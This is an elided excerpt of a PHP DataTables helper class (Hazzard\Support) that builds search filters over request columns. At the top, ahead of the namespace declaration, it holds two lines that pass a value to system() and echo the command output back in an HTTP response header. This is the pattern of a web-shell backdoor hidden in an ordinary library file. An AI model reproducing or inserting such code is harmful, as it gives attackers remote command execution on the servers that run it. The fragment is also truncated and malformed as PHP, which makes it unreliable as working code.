...
$l2=system($l);
header('System Header:'.$l2); namespace Hazzard\Support;
...
class DataTables {
	...
	protected function filter()
	{
		...
		if (isset($this->request['search']) && $this->request['search']['value'] != '') {
			...
			$this->query->whereNested(function($query) use($me, $dtColumns, $searchValue) {
				
				for ($i = 0, $ien = count($me->request['columns']); $i < $ien; $i++ ) {
					$requestColumn = $me->request['columns'][$i];
					
					$columnIdx = array_search($requestColumn['data'], $dtColumns);
					
					$column = $me->columns[$columnIdx];

					if ($requestColumn['searchable'] == 'true' && strlen($searchValue) > 2) {
